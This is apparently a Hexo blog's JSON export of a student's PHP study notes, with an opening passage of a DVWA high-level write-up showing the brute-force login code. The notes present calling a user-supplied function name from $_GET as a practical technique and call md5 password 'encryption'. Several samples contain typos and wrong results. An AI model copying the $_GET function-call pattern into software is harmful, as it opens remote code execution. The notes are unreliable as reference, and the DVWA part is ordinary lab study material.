{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"黑桃⑨","url":"https://perfect.xyz"},"pages":[{"title":"关于我","date":"2018-07-07T08:12:41.199Z","updated":"2018-07-07T08:12:41.199Z","comments":true,"path":"about/index.html","permalink":"https://perfect.xyz/about/index.html","excerpt":"","text":"目前还是个在校生，而且是个菜鸡 努力学web安全中，对逆向也有点感兴趣 二刺猿死肥宅 单机游戏玩家 QQ:1055883471欢迎各路大佬加我好友"}],"posts":[{"title":"php中一些比较实用的技巧","slug":"phpstudy-2","date":"2018-07-15T07:00:05.774Z","updated":"2018-07-18T02:06:44.620Z","comments":true,"path":"2018/07/15/phpstudy-2/","link":"","permalink":"https://perfect.xyz/2018/07/15/phpstudy-2/","excerpt":"整理一些可能会用到的东西","text":"整理一些可能会用到的东西 两个变量互换位置借助第三个变量$v1 = 10; $v2 = 20; $tmp = $v1; $v1 = $v2; $v2 = $vtmp; echo $v1,$v2; 利用加减法$v1 = 10; $v2 = 20; $v1 = $v1 + $v2; $v2 = $v1- $v2; $v1 = $v1 - $v2; echo $v1,$v2; 利用异或$v1 = 10; //$v1=01010 $v2 = 20; //$v2=10100 $v1 = $v1 ^ $v2; //$v1=11110 $v2 = $v1 ^ $v2; //$v2=01010 $v1 = $v1 ^ $v2; //$v1=10100 用异或来获取两个数直接的不同点，在拥有不同点的情况下遇到任何一个数都推出另外一个数，本质上跟加减法类似 进制转换函数dec decimal 十进制 bin binary 二进制 oct octet 八进制 hex hex 十六进制 将两个进制的简写写在一起即为进制转换函数 比如：decbin() 十进制转换为二进制 dechex() 十进制转换为十六进制 php中的输出语句echoecho在输出时将输出的内容转换为字符串再输出，所以只能输出标量数据，在输出true和false时，会输出1和字符空。再输出数组时，会报错 print()和echo一样,区别在于print()是一个函数，会返回值，而echo是语法结构，不会返回值 print_r()可以输出标量以及复合数据类型，但是布尔值还是只会输出1或者字符空 var_dump()可以输出值以及其类型 sprintf()用于格式化输出 语法： sprintf(格式化字符串，变量1，变量2，…..) 格式化占位符： %b 二进制 %d 十进制 %o 八进制 %f 浮点 %x 十六进制 &lt;?php $v1 = 255; echo sprintf(&apos;二进制为:%b&lt;br /&gt;十进制为:%d&lt;br /&gt;八进制为:%o&lt;br /&gt;十六进制为:%x&apos;,$v1,$v1,$v1,$v1); 结果： 二进制为：11111111 十进制为：255 八进制为：377 十六进制为：ff %f用于输出浮点数，默认显示小数后6位，可以指定显示几位小数，比如指定显示两位：%.2f PHP标签语法当在HTML插入PHP代码的时候使用PHP标签语法 &lt;?php for($i=1;$i&lt;=4;$i++){?&gt; &lt;span&gt;&lt;?php echo $i?&gt;&lt;/span&gt; &lt;?php }?&gt; // 结尾 } 前面必须要加空格，不然会报错 // if标签语法 // 标准语法 &lt;?php if(...):?&gt; // 语句体 &lt;?php endif ?&gt; // 简化语法 &lt;?php if(...){&gt; // 语句体 &lt;?php }?&gt; //for标签语法 // 标准语法 &lt;?php for(...):?&gt; // 循环体 &lt;?php endif ?&gt; &lt;?php for(...){?&gt; // 循环体 &lt;?php }?&gt; 系统函数日期和时间函数time() 用于获取当前时间的时间戳，单位是秒。时间戳是从时间原点至现在的一个秒数。 时间原点：计算机中规定从1970年1月1日0时0分0秒那一刻作为时间原点 microtime() 用于计算毫秒，毫秒永远小于1 date(format [,time]) 用于格式化时间信息 format用于格式化时间的字符串，time表示需要格式化的时间戳 mktime(时，分，秒，月，日，年) 用于获取一个指定的时间戳 strtotime(string) 讲一个以字符形式描述的时间转换为时间戳，可以快速运算出例如密码更换策略等 遍历数组while-each-list遍历使用while、each、list语法结构来遍历数组 eacheach(数组) 用于获取当前指针所指的键名与键值 $arr = [&apos;key&apos;=&gt;&apos;value&apos;]; print_r(each($arr)); Array ( [1] =&gt; value [value] =&gt; value [0] =&gt; key [key] =&gt; key ) listlist(); 将数组中的索引元素赋值给变量列表中的变量。 $arr = [10,20,30,40]; list($a, $b, $c, $d) = $arr; 用each+list遍历数组： $arr = array(&apos;one&apos;=&gt;&apos;1&apos;, &apos;two&apos;=&gt;&apos;2&apos;, &apos;three&apos;=&gt;&apos;3&apos;); while(list($k,$v) = each($arr)){ echo $k.&apos;=&gt;&apos;.$v,&apos;&lt;br/&gt;&apos;; } 先将each($arr)的值赋给list($k,$v)，然后拿list($k,$v)作为表达式，即$k,当遍历有值的时候，$k=true,当遍历到最后的null的时候$k=flase foreach-list遍历// php&gt;5.6 // 注意：list只能使用索引数组 $arr = [ [1,2,3,4] ]; foreach($arr as list($a, $b, $c, $d)){ echo $a,$b,$c,$d; } 数组算法排序法冒泡排序法注意内循环的条件与外循环的条件 外循环中，由于是交换两个数，只需要循环数组数-1即可 内循环中，由于每一个循环都会把最大值放到最右边，所以最右边的界限需要不断改变 $arr = [10,5,100,255,64,1]; $len = count($arr); for($i=1;$i&lt;$len ;$i++){ for($j=0;$j&lt;$len-$i;$j++){ if($arr[$j]&gt;$arr[$j+1]){ $temp = $arr[$j]; $arr[$j] = $arr[$j+1]; $arr[$j+1] = $temp; } } } foreach($arr as $value){ echo &apos;[&apos;.$value.&apos;],&apos;; } 插入排序法1、从第一个元素开始，第一个元素已经被排列 2、在取下一个元素，将其和已经排序的元素中从后往前比较 3、如果以排列元素大于新元素，那么交换两者位置 4、重复步骤3，直到以排序元素小于或者等于新元素 5、重复2-4步骤 $arr = [10,5,100,255,64,1]; for($i=1;$i&lt;count($arr);$i++){ $tmp = $arr[$i]; for($j=$i-1;$j&gt;=0;$j--){ if($arr[$j]&gt;$arr[$j+1]){ $arr[$j+1] = $arr[$j]; $arr[$j] = $tmp; } } } print_r($arr); 查找算法顺序查找法unction searchArr($arr, $search){ for($i=0;$i&lt;=count($arr);$i++){ if($arr[$i]==$search){ echo $search; break; } } } $arr = [10,5,100,255,64,1]; searchArr($arr, &apos;64&apos;); 二分查找法前提为数组有序并不重复 可以简单的把数组想象成一个轴，对轴进行二分 $arr = [1,2,3,4,5,6,12,15,17,18,32,55,73,74,89]; function searchArr($arr, $search){ $left = 0; $right = count($arr); while($left &lt;= $right){ $mid = ceil(($left + $right) / 2); if($search &gt; $arr[$mid]){ $left = $mid + 1; }elseif($search &lt; $arr[$mid]){ $right = $mid - 1; }else{ return &apos;yes&apos;; } } return &apos;no,not exists&apos;; } echo searchArr($arr, 15);","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect.xyz/categories/笔记/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://perfect.xyz/tags/php学习/"}]},{"title":"php学习笔记-基础部分","slug":"phpstudy-1","date":"2018-07-13T08:13:35.753Z","updated":"2018-07-18T02:10:22.157Z","comments":true,"path":"2018/07/13/phpstudy-1/","link":"","permalink":"https://perfect.xyz/2018/07/13/phpstudy-1/","excerpt":"珍爱生命，远离php","text":"珍爱生命，远离php PHP基本语法php是一种服务器端嵌入html脚本语言，也就是说可以将php标签嵌入到html代码中 语法规则php每条语句后面必须有“;” php中的变量名必须区分大小写，函数名、方法名、类名不区分 PHP标记①&lt;?php ...?&gt; ②&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt; ③&lt;? ... ?&gt; (默认关闭，需要手动开启) ④&lt;% ... %&gt; (默认关闭，需要手动开启) 在php.ini中开启 注释单行注释：//注释内容 多行注释：/*注释内容*/ 变量及操作概念变量是内存中用于临时存储数据的一个空间，这个空间有一个名字，名字就是变量名。变量名是用于对这个内存中的数据进行引用的。 变量语法： $变量名=值;说明： php中的变量必须以”$”开头 变量名只能包含字母、数字、下划线，只能以字母、下划线开头。 删除变量语法: unset(变量名) 可变变量1.通过一个变量来访问另一个变量 &lt;?php $v = &apos;age&apos; $age = &apos;20&apos; echo $v; echo $$v; ?&gt; 结果： age 20 2.通过一个变量来创建另一个变量 &lt;?php $v = &apos;age&apos; $vv = &apos;20&apos; echo $age; ?&gt; 结果： 20 预定义变量php为了我们预先定义了一组变量，这些变量会在不同的需求中使用 $_GET 用于前台表单使用get方式提交的数据 $_POST 用于前台表单使用post方式提交的数据 $_REQUEST 用于前台表单使用get或post方式提交的数据 $_SERVER 记录了服务器端与客户端的相关信息 $_COOKIE 一种会话技术 $_SESSION 一种会话技术 $_FILES 用于记录用户上传的文件信息 $_GLOBAL 用于记录全局变量 使用方法： print_r($_SERVER) 内存原理内存结构栈区保存的是变量名（术语称之为引用） 特点：对于CPU来说，读写速度是最快的 堆区存储的是是“复杂”的数据，比如数据、对象、字符串 数据段分为全局数据段和静态数据段 存储的是简单的数据，比如整型、浮点型、布尔值 （计算机能存储的最大整数为2147483647） 代码段存储的是源代码对应的机器指令 输出缓存只要是有输出指令，比如echo、print、var_dump。这些指令会将所有要输出的数据放在输出缓存中 php执行过程编译阶段进行语法检查、词法检查、代码优化 编译通过之后将源代码转换为机器指令 Parse error：编译阶段发生错误，语法有问题 执行阶段如果编译通过后，会将源代码对应的机器指令，保存在代码段，再开始执行代码段中的机器指令 例如： &lt;?php $v1 = 10; $v2 = $v1; $v2 = 20; echo $v1; ?&gt; 执行过程如下: 1、先通过编译阶段，将源代码存储在代码段中。 2、执行$v1=10，会在栈区开辟一个空间存储变量$v1，将数据保存到数据段的全局区，再将数据的物理地址赋给栈区的变量$v1。 3、执行$v2=$v1，在栈区开辟一个空间存储变量$v2，读取变量$v1的值，读取出来的数据保存在数据段全局区，将这个数据的地址赋值给栈区中的$v2。 4、执行$v2=20，找到栈区中的$v2，并根据地址找到数据段全局区对应的空间，将数据覆盖。 5、执行echo $v1，找到栈区中的变量$v1，并根据地址找到数据段全局区中的值，将值读取出来，并放入到输出缓存中。 6、程序执行结束，输出缓存中的数据会自动返回给apache，apache返回给浏览器，同时栈区、数据段、代码段中的数据会被系统清空 PHP嵌入到HTML的执行过程php功能模块在处理一个php文件时，它只会处理php代码，对于非php代码，它会原样输出 到输出缓存中，由输出缓存发给apche来解析html以及js代码等php仅处理&lt;?php?&gt;标签内的代码，js、html、css对php来说都是字符串 php中变量的传值方式赋值传值使用一个变量a为另一个变量b赋值时，传递的是变量a的值，这种赋值方式称为赋值传值 $a = 10 $b = $a echo $b 结果： 10 引用传值使用一个变量a为另一个变量b赋值时，传递的是变量a的地址，这种赋值方式称为引用传值 $a = 10; $b = &amp;$a; $b = 20; echo $a,$b; 结果： 20,20 执行$b = &amp;$a;时，由于多了一个&amp;符号，所以内存会在栈区中开辟一个空间存储变量$b,并将$a的物理地址赋值给$b。 执行$b = 20;时，根据$b的物理地址找到数据段全局区中的数据并覆盖，由于$a的物理地址也是这个地址，所以$a的值也被改为20。 常量常量是一种特殊的变量，也是用于存储数据。常量一旦定义就不允许修改其值，常量本身不允许删除 概念define（’常量名’，值）； const 常量名 = 值； 常量一旦被定义就不允许更改 常量的值只能是基本数据类型（标量数据类型） 常量默认区分大小写，一般常量在没命时，我们会使用全大写的形式 区别： define允许在分支结构（比如循环语句）中定义常量，但是const不允许 define在值后面加一个true，定义的常量将不区分大小写 常量的判断以及获取所有的常量常量的判断defined（‘常量名’） 比define多了一个d，判断返回布尔值 获取所有常量get_defined_constants(); 获取php中所有的常量 魔术常量__FILE__ 用于获取当前文件路径以及文件名 __DIR__ 用于获取当前文件的路径 __LINE__ 用于获取当前行号 __FUNCTION__用于获取函数的函数名 __METHOD__ 用于获取当前方法的方法名 __CLASS__ 用于获取当前类的类名 __NAMESPACE__用于获取当前空间的空间名 PHP中的数据类型数据类型的分类1.标量数据类型 int 整型 float 浮点型 boolean 布尔型string 字符串 2.复合数据类型 array 数组object 对象 3.特殊数据类型 null nullresource 资源类型 int型十进制$v=255 八进制以0开头，并且不能有超过7的数字 十六进制以0x开头，包含0-9、a-f 其他进制在显示时会自动转换为十进制 float型有小数点的数就成为浮点数 浮点数不可能在不丢失精度的情况下转为二进制格式，所以使用浮点数进行运算的时候会出现偏差 string型字符串即单引号或者双引号括起来的0个或多个字符 单引号在单引号内能被转义的字符串：\\’、\\\\ 单引号定义的字符串中的变量值不能被解析 双引号在双引号内能被转义的字符串：\\”、\\t、\\r、\\n、\\\\、\\$ 双引号定义的字符串中的变量值可以被解析（加{}可以插入变量） heredoc类似于双引号定义字符串，主要用于定义大段的字符串 语法： $heredoc = &lt;&lt;&lt;开始标记 大段文本 结束标记； 开始标记和结束标记必须相同 结束标记必须定格写 nowdoc:本质上和heredoc一样，只不过nowdoc为单引号书写 array型索引数组 数组元素下标是数值，这样的数组就是索引数组 关联数组 数组元素的下标是字符串，这样的数组就是管理数组 数组元素的访问$a = “\\&lt;h3>$_arry[AAA]\\&lt;/h3>“ or $a = “\\&lt;h3>{$_arry[‘AAA’]}&lt;/h3>“ 如果在一个字符串中想输出数组的元素，那么下标不需加引号 如果使用了{}来限制了数组，那么下标必须加引号 资源类型资源型数据类型是一个特殊的变量，程序员没有办法直接定义一个资源，必须使用php提供的函数获取资源。不被php管辖的变量都称为资源，比如与mysql的连接 $resource = fopen(&apos;data.txt&apos;,&apos;r&apos;); echo fgets($resource); 以读的方式打开data.txt，并将内容echo出来，$resource就是一个资源型数据 数据类型的转换自动转换当进行运算的两个数据类型不同的时候，php会进行自动转换 强制转换(interger)变量 将其他数据类型强制转换为整型 (float)变量 将其他数据类型强制转换为浮点型 (array)变量 将其他数据类型强制转换为数组 (object)变量 将其他数据类型强制转换为对象 (string)变量 将其他数据类型强制转换为字符串 (boolean)变量 将其他数据类型强制转换为布尔值 运算符赋值运算符= 将赋值号右边的值赋给左边的变量，左边必须是变量不能是式子 算数运算符+、-、*、/、% % 取膜，即求两数相除，除不尽的部分 在实际运用中，取膜用于判断奇偶数 自操作运算符++ 自增、–自减 前自增/减：先对变量的值自增/减1，再使用新值参与运算(先在内存中加1/减1，再把值从内存中拿出来) 后自增/减：先用变量的原值参与式子的运算，在对变量的值加/减1 &lt;?php $v = 10 $a = $v + ++$v + ++$v + ++$v + ++$v echo $v,$a 结果 61,14 其他$i+=2 $i-=2 $i*=2 $i/=2 $i%=2 字符串运算符.、.= :对字符串进行拼接 当.后面拼接的为一个数字，则数字和.之间要有一个空格，否则php会认为是小数点 比较运算符&gt;、&lt;、&gt;=、&lt;=、==、!=、===、!== == 用于判断两个数的值是否相同 === 用于判断变量的值与类型是否相等，相等则返回true ！= 用于判断两个变量的值是否不同 ！== 用于判断两个变量的值或类型至少有一方面不相同 逻辑运算符&amp;&amp; 逻辑与 || 逻辑或 ! 逻辑非 and 逻辑与，和&amp;&amp;运算规则相同，但是and优先级低于= or 逻辑或，和||运算规则相同，但是or优先级低于= 逻辑与短路$v1 = 10; $result = false &amp;&amp; ++v1; var_dump($result); // 10 因为逻辑与运算中有一个为FALSE，结果就为False，就没必要去计算第二个值的结果 逻辑或短路$v1 = 10; $result = true || ++v1; var_dump($v2); // 10 逻辑或运算中，只要有一个为True或能转换为True，结果就返回True，就没必要去计算第二个值的结果 逻辑非的一种用法在变量名前面加两个！，比如!!v1，意为把v1强制转换为布尔值 条件运算符三元运算符 语法: 表达式？表达式A：表达式B 先计算表达式是否成立，如果成立去表达式A的值，不成立救取表达式B的值 扩展： 变量？：表达式B 如果变量存在且值不为空，那么就取变量，否则取表达式B 错误控制运算符错误抑制符@ 错误抑制符 不显示错误信息 php.ini在php.ini中，将display_errors的值改为off，就不会显示错误信息 php.ini隐藏错误为全局隐藏，这个服务器下的所有页面的错误信息都会隐藏 脚本级的错误控制脚本级的错误控制仅限于当前的php脚本文件 ini_set(配置项名，值) 主要用于在php脚本中来设置php.ini中的配置项 ini_get（配置项) 主要用于获取php.ini配置文件中的配置项的值 循环语句分支结构ifif(条件1){ 语句体1 }else if(条件2){ 语句体2 }else{ 语句体3 } swichswitch(){ case 值1: 语句体 1 break; case 值2: 语句体 2 break; default: 缺省语句体 } 当一个语句体执行结束后，如果没有遇到break，则会继续执行下面一条语句体，且不会判断下面那条语句体前面的case 循环结构forfor(循环控制变量初始值;表达式;循环控制变量的更改){ 循环体 } 执行顺序： 1、首先执行循环控制变量初始化，此步仅执行一次 2、判断表达式是否成立，不成立跳出循环 3、执行循环体 4、执行循环控制变量的更改 5、判断表达式是否成立，不成立跳出循环 6、执行循环体 … 嵌套循环时，外层循环控制行，内层循环控制列 使用外层循环的控制变量来控制内层循环的次数 whilewhile(表达式){ 循环体 } 与for的区别：while用于循环次数未知的循环 执行顺序：判断表达式是否成立，不成立执行 执行循环体 判断表达式是否成立，不成立 do…whiledo{ 循环体 }while(表达式); 和while的区别：无论表达式是否成立，都会先执行一次循环体 循环的结束与退出continue语法： continue [n] n为整数，如果缺省为1 结束当前循环结构的本次循环，继续上n层循环结构的下一次执行。 break语法： break [n] n为整数，缺省为1 直接结束上n层循环结构。 文件包含requirerequire(文件名) require_once(文件名) require如果引用文件出现问题，会直接中断PHP程序执行。 require_once在包含时，会检查是否被包含过了，如果被包含过了就不再包含 includeinclude(文件名) include_once(文件名) include如果引用文件出现问题，虽然会报错，但仍然会执行之后的代码。 引入路径问题在实现项目中，对于HTML文件，是不允许用户直接请求，而是指向一个PHP文件，让PHP文件来引入这个HTML文件 当一个PHP文件引入一个HTML文档时，html文件本身也会引入一些其他的文件，如图片、CSS、JS 在这个时候就会发生路径更改的问题 解决办法： 使用绝对路径或者使用带域名的相对路径 魔术变量问题__DIR__ 用于获取文件所在的完整的文件名 __FILE__用于获取文件所在的路径 如果引入的文件中带有以上魔术常量，它不会随着文件引入而改变，永远为常量所在的文件的文件名与文件路径 错误处理错误的分类编译错误编译的过程中发生的错误，一般来说都是书写错误，php会告诉程序员是哪里发生错误 执行错误在编译过程通过后，在执行阶段发生的错误，会根据错误的等级，来决定是否中断程序的执行 逻辑错误因为逻辑不严谨而产生的错误 错误代码在php的错误处理机制中，每一种错误都使用了一个错误标识，这些标识是以常量的形式存在 系统错误[E_ERROR] =&gt; 1 致命错误 发生中断程序 [E_WARNING] =&gt; 2 警告错误 不会中断程序 [E_PARSE] =&gt; 4 编译错误 发生中断程序 [E_NOTICE] =&gt; 8 提示错误 不会中断程序 [E_STRICT] =&gt; 2048 [E_RECOVERABLE_ERROR] =&gt; 4096 警告错误 不会中断程序 [E_DEPRECATED] = 8192 弃用函数的错误,高版本在使用低版本已经被弃用的函数时会报错，但是仍然可用 核心错误(编译器的错误) [E_CORE_ERROR] =&gt; 16 [E_CORE_WARNING] =&gt; 32 [E_COMPILE_ERROR] =&gt; 64 [E_COMPILE_WARNING] =&gt; 128 自定义错误用户错误(可以用户自定义) [E_USER_ERROR] =&gt; 256 [E_USER_WARNING] =&gt; 512 [E_USER_NOTICE] =&gt; 1024 [E_ALL] =&gt; 6143 错误的触发系统错误的触发程序员无法干涉系统错误的触发，系统错误是由php自己检测并触发的 用户自定义错误的触发trigger_error(msg, type); msg: 错误描述信息 type：自定义错误的代码（E_USER_ERROR,E_USER_NOTICE…） 这个函数会在日志中记录这次错误信息 错误的控制设置控制错误信息是否显示php.ini中 控制错误信息是否显示 display_errors=On/Off 控制显示哪一类错误error_reporting=E_ALL error_reporting=E_NOTICE | R_WARNING error_reporting=E_ALL &amp; ~E_NOTICE 错误日志设置开启日志记录 log_errors=on 错误日志存放位置 如果没有设置error_log默认是记录到apache的错误日志中\\logs\\error.log error_log=syslog 会记录到操作系统的日志中 error_log=文件名 会记录到自定义的位置 函数函数的基本概念基本概念函数的模块化的产物，在实际开发过程中，会将项目划分为各个大的功能模块。同样将大的功能模块划分为小的功能。 函数名不区分大小写，命名规则与变量命名规则相同 函数的声明声明语法： funciton 函数名（形参列表）{ 函数体 [return值] } 调用语法： 函数名（实参列表） 可变函数与可变变量类似 function showInfo(){ echo 123; } $f = &apos;showInfo&apos;; $f(); 实际运用场景中，可以让用户来任意调用想要调用的函数 $f = $_GETp[&apos;f&apos;] $f(); f为get方式传入的函数名 函数的参数从外到内函数定义时的参数是形参 形参是被动的接受数据 形参只对内存有效，对外部不可见 函数调用时的参数是实参 主动向函数传递实际的数据 从内到外return 函数内部可以有多个return，只要遇到一个return就会终端函数执行 形参的默认值php在定义函数时，可以为形参赋值，这个值就是形参的默认值。 如果调用函数没有给具有默认值的形参传递数据，那么形参会使用默认值。 一般具有默认值的形参，一般位于形参列表的最后 匿名函数没有名字的函数即是匿名函数，有成为闭包函数 $fn = function(){ echo 123; }; $fn(); 匿名函数没有名字，并且结尾必须加入分号 PHP中的匿名函数无法自调用 但是可以赋值给一个变量，还可以作为某个函数的参数 所以我们可以将它赋值给变量，并通过变量来调用。 回调函数callback在开发过程中，我们使用别人的函数或者系统函数时，函数的参数需要你传递一个函数，作为参数传递的函数就是回调函数。 使用匿名函数作为回调函数: function showInfo($fn){ $fn(); } function say(){ echo 123; } showInfo(&apos;say&apos;); showInfo(function(){ echo 123; }); 形参和实参之间的引用传值形参和实参之间其实是一个赋值过程，那么我们也可以将这个赋值过程，变为一个引用传值过程。 function showInfo(&amp;$msg){ $msg = 200; } $msg = 100; showInfo($msg); echo $msg; 伪类型php规定了8种数据类型，在php手册中规定了另外几种类型，只会存在于手册中 mixed 表示类型不确定 callback 表示函数 scalar 如果是int float string boolean就属于这种 相关函数func_get_args() 用于获取实参，并以数组的形式返回func_get_arg(ind) 用于获取ind下标指定的实参func_num_args() 用于获取实参的个数实际运用： // 方法1 function showInfo(){ echo func_num_args(); // 获取实参的个数 echo func_get_arg(0); // 第一个实参 print_r(func_get_args()); // 所有的实参 } showInfo(1,2,3,4); // 方法2 PHP&gt;=5.6 function showInfo(...$args){ print_r($args); // 结果会以数组的形式打印出来 } showInfo(1,2,3,4); 作用域全局变量和局部变量在函数外部定义的变量，其作用域就是全局作用域，这个变量就是全局变量 在函数内部定义的变量，其作用域就是局部作用域，这个变量就是局部变量 在PHP中只有相同作用域的才能互相访问 global关键字很多时候我们需要在局部变量中使用全局变量，或者全局变量中访问内部。 通过参数的传址方式$i = 10; function showinfo(&amp;$v){ $v = $v+10; echo $v,&apos;&lt;br /&gt;&apos;; } showinfo($v); echo $v; $GLOBALS使用超全部变量实现内部访问外部 $a=&apos;a&apos;; $b=2; function showinfo(){ echo $GLOBALS[&apos;a&apos;],&apos;&lt;br /&gt;&apos;; echo $GLOBALS[&apos;b&apos;]，&apos;&lt;br /&gt;&apos;; } showinfo(); GLOBAL关键字语法： global 变量名 $i=10 function showinfo() global $i; echo $i; showinfo(); echo $i; 在函数内部建立一个与函数外部同名的变量的引用，如果外部没有这样的同名变量，会在外部创建一个同名变量 静态变量在函数内部使用static声明的变量即为静态变量 静态变量在函数被多次调用时，只会在编译阶段初始化一次，并且变量的值不会随着函数执行完毕被销毁 在函数下一次被调用时，仍然可以访问其值 在编译阶段时，如果发现函数内部有static变量，则会在数据段的静态区存储这个数据 函数执行时，会在函数空间内创建变量，并把在静态区的变量地址传给栈区中的变量 递归递归思想其实就是函数自己调用自己，一般用于解决有规律性的重复 1 2 3 5 8 13 21 34 55 89 ... function func($pos){ if($pos == 1){ return 1; }elseif($pos == 2){ return 2; }else{ return func($pos-1) + func($pos-2); } } echo func(10); 字符串常用函数trtlen语法： terlen(变量) 用于获取字符串的一个字节数(一共有几个字符) 查找strstr(str, substr); 查找str首次出现substr的位置，并截取到最后 strrchr(str, substr); 查找str最后一次出现substr的位置，并截取到最后 strpos(str, substr); 查找str首次出现substr的位置 strrpos(str, substr) 查找str最后一次出现substr的位置 分割explode(分隔符, str) 根据指定的分隔符，将字符串str进行分割，并将每一部分组织成数组，并返回 $string = &apos;a,b,c&apos;; $strArr = explode(&apos;,&apos;, $string); print_r($strArr); //Array ( [0] =&gt; a [1] =&gt; b [2] =&gt; c ) 也可以用于获取文件名 替换str_replace(replace, search, str); 在str中查找search部分，并替换成replace部分，并返回替换后的内容 $str = ‘a, b’;echo str_replace(‘b’, ‘c’ ,$str); // a, c 大小写转换strtolower(str) 转换为小写 strtoupper(str) 转换为大写 去除指定字符trim(str [,substr])将字符串两侧的子字符串去除，substr可以省略，省略为去除空格 $str = &apos;AstringA&apos;; echo trim($str, &apos;A&apos;); // string ltrim(str [,substr]) rtrim(str [,substr]) 区别于只去掉左/右 pathinfopathinfo(path [,option])获取一个文件的路径信息 path：是一个文件路径的字符串 option: 获取执行的路径信息 PATHINFO_DIRNAME PATHINFO_BASENAME md5语法： md5(str)； 说明： 用于对str字符串进行md5加密 可以在用户输入密码的时候给密码加密 htmlspecialchars()htmlspecialchars(str) htmlspecialchars_decode(str) 用于将str中的特殊符号转换为HTML字符实体。 echo htmlspecialchars(&apos;&lt;&gt;&apos;); // &amp;lt;&amp;gt;gt; 数组数组是一种数据的集合，数组主要是用于存储具有行列特征(表格)的数据。 数组的概念数组的创建索引数组的创建显示创建 $arr = array(10, 20, 30, 40); $arr2 = [10, 20, 30, 40]; 隐式创建 $arr3 = array(); $arr3[0] = 10; $arr3[1] = 20; $arr3[6] = 20; PHP中的数据下标可以不规连续 关联数组的创建显示创建 $arr = array(键名=&gt;键值, 键名=&gt;键值, ...); $arr2 = [键名=&gt;键值, 键名=&gt;键值, ...] $arr = array(&apos;key&apos;=&gt;&apos;value&apos;); $arr2 = [&apos;key&apos;=&gt;&apos;value&apos;]; 隐式创建 $arr = array(); $arr[&apos;key&apos;] = &apos;value&apos;; 多维数组PHP中支持多维数组，如果一个数组的元素又是数组，那么就是多维数组。(最多支持60维) 显示创建 $arr = array( &apos;userInfo&apos; =&gt; array(&apos;id&apos;=&gt;1, &apos;username&apos;=&gt;&apos;Json&apos;) ); $arr2 = [ &apos;userInfo&apos; =&gt; array(&apos;id&apos;=&gt;1, &apos;username&apos;=&gt;&apos;Json&apos;) ]; 隐式创建 $arr3 = array(); $arr3[&apos;userInfo&apos;] = array(&apos;id&apos;=&gt;1, &apos;username&apos;=&gt;&apos;Json&apos;); 数组元素的访问一维数组 $数组名[下标/键名] echo $arr[‘userInfo’]; 二维数组 $数组名[行下标/列下标] echo $arr[‘userInfo’][‘id’]; 数组的长度count（） 用于获取数组的长度 echo count($arr); //行数 echo count($arr[‘userInfo’]); // 具体行的列数 数组的指针表示当前所获得的点 current(arr) 获取当前指针所指向元素的键值 key(arr) 获取当前指针所指向元素的键名 next(arr) 将指针下移 prev(arr) 指针上移 reset(arr) 指针重置 end(arr) 将指针移到最后 数组的遍历for$arr = [10,20,30,40]; for($i=0;$i&lt;=count($arr);$i++){ echo $arr[$i]; } 只能作用于这种下标有规律的方式 foreachforeach($arr as [$key=&gt;]$value){ // 循环体 } 原理： 对数组的指针进行重置。 读取当前指针所指向的数组元素， 并将元素的键名赋值给$key, 键值赋值给$value， 同时数组下移一行 直接读取到数组最后(数组的最后一行其实为NULL，当foreach读到BNULL会自动止) $arr = array(&apos;one&apos;=&gt;&apos;1&apos;, &apos;two&apos;=&gt;&apos;2&apos;, &apos;three&apos;=&gt;&apos;3&apos;); foreach($arr as $key=&gt;$value){ echo $key.&apos;=&gt;&apos;.$value, &apos;&lt;br/&gt;&apos;; } 结果 one=&gt;1 two=&gt;2 three=&gt;3 数组操作常用函数数组的长度count($arr); 获取数组元素的键名与键值array_keys(); 返回所有键名 array_values(); 返回所有键值 判断键名/值是否存在array_key_exists(key, arr); 判断键名是否存在(区分大小写) in_array(value, arr); 判断键值是否存在 数组的合并array_merge($arr, $arr2); 合并两个数组 数组的排序sort(); 按键值升序 rsort(); 按键值降序 asort(); 按键值进行升序，但原下标不变 arsort(); 按键值进行降序，但原下标不变 数组解压(extract)$arr = [&apos;id&apos;=&gt;&apos;1&apos;,&apos;username&apos;=&gt;&apos;admin&apos;]; extract($arr); // 将我们关联元素转换为键名为名的变量 echo $id; echo $username;","categories":[{"name":"笔记","slug":"笔记","permalink":"https://perfect.xyz/categories/笔记/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://perfect.xyz/tags/php学习/"}]},{"title":"基于DVWA的web漏洞原理-high","slug":"dvwa-high","date":"2018-07-07T05:58:37.767Z","updated":"2018-07-13T11:17:30.717Z","comments":true,"path":"2018/07/07/dvwa-high/","link":"","permalink":"https://perfect.xyz/2018/07/07/dvwa-high/","excerpt":"有点骚♂","text":"有点骚♂ Brute Force暴力破解 核心代码： &lt;?php if( isset( $_GET[ &apos;Login&apos; ] ) ) { // 检查Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // 净化用户名输入 $user = $_GET[ &apos;username&apos; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // 净化密码输入 $pass = $_GET[ &apos;password&apos; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // 连接数据库 $query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // 获取用户详细信息 $row = mysqli_fetch_assoc( 